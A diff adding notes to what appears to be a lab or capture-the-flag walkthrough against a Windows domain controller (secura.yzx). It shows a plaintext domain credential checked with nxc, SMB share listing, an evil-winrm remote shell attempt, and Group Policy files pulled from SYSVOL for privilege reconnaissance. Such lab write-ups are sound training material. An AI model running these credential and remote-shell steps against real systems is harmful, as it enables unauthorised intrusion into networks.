@@ -55,3 +55,64 @@ Host script results:
 |   FQDN: dc01.secura.yzx
 |_  System time: 2026-07-02T05:45:29+00:00
 ```
+#### [1]
+```
+$ nxc smb 192.168.82.97 -u Eric.Wallows -p EricLikesRunning800
+SMB         192.168.82.97   445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:secura.yzx) (signing:True) (SMBv1:True) (Null Auth:True)                                                            
+SMB         192.168.82.97   445    DC01             [+] secura.yzx\Eric.Wallows:EricLikesRunning800
+```
+#### [2]
+```
+$ smbclient -L //192.168.82.97 -U Eric.Wallows
+Password for [WORKGROUP\Eric.Wallows]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+        test            Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 192.168.82.97 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+```
+#### 没有添加域名
+```
+$ evil-winrm -i secura.yzx -u Eric.Wallows -p EricLiskesRunning800
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                          
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                     
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\> whoami
+                                        
+Error: Check your /etc/hosts file to ensure you can resolve secura.yzx
+                                        
+Error: Exiting with code 1
+```
+#### 添加域名
+```
+$ sudo vi /etc/hosts
+
+192.168.82.97 secura.yzx
+```
+#### 下载
+```
+$ smbclient  //192.168.82.97/SYSVOL -U Eric.Wallows
+
+smb: \secura.yzx\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Services\> get Services.xml
+
+smb: \secura.yzx\Policies\{6AC1786C-016F-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\> get GptTmpl.inf
+```
+#### *S-1-5-32-544
+#### $ cat Services.xml
+```
+<?xml version="1.0" encoding="utf-8"?>
+<NTServices clsid="{2CFB484A-4E96-4b5d-A0B6-093D2F91E6AE}"><NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}" name="WinRM" image="2" changed="2022-10-25 17:35:16" uid="{401AC3E6-C47E-44A5-89E4-FC427698E07D}"><Properties startupType="AUTOMATIC" serviceName="WinRM" serviceAction="START" timeout="30"/></NTService>
+</NTServices>
+```
